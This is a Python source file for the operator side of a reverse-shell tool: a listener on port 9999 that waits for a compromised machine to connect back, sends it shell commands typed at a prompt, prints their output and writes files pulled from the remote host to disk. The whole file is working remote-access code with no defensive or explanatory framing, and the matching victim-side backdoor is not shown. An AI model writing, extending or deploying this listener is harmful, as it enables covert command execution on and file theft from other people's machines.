#!/usr/bin/python
import json
import socket
import os

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(2)
        print("[+] Waiting for a connection")
        self.connection, addr = listener.accept()
        print("[+] Got a connection from ", str(addr))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(content)
            return "[+] Download successful."
    def run(self):
        while True:
            try:
                command = input(">> ")
                command = command.split(" ")
                result = self.execute_remotely(command)
                if command[0] == "download":
                        result = self.write_file(command[1], result.encode())
                print(result)
            except Exception as e:
                print("Exception: ", e)

my_listener = Listener("0.0.0.0", 9999)

my_listener.run()
